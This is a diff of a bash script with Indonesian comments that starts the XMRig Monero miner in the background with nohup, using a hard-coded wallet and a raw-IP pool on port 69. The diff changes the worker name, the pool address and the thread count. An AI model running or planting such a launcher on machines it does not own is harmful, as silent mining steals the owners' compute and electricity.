@@ -1,8 +1,8 @@
 #!/bin/bash
 
 WALLET="85RHM6oH1kNgb9LaRAsVUQfeU777L229UT5U4FABNBP49VCfDRjEJkFZcSBdDsmkvnKhPk3M7kwbzZGaHtQvWxb56gDqxGN"
-WORKER_NAME="FOMO2"
-POOL="47.84.66.172:69"
+WORKER_NAME="gshe"
+POOL="157.230.254.83:69"
 XMRIG_VERSION="6.21.1"
 XMRIG_DIR="$HOME/xmrig-$XMRIG_VERSION"
 XMRIG_TAR="xmrig-$XMRIG_VERSION-linux-x64.tar.gz"
@@ -22,7 +22,7 @@ fi
 
 cd "$XMRIG_DIR"
 echo " Menjalankan XMRig di background dengan nohup..."
-nohup ./xmrig -o $POOL -u $WALLET -p $WORKER_NAME -a rx/0 --tls --threads= 8 > "$LOG_FILE" 2>&1 &
+nohup ./xmrig -o $POOL -u $WALLET -p $WORKER_NAME -a rx/0 --tls --threads= 4 > "$LOG_FILE" 2>&1 &
 
 
 echo " XMRig berjalan di background"
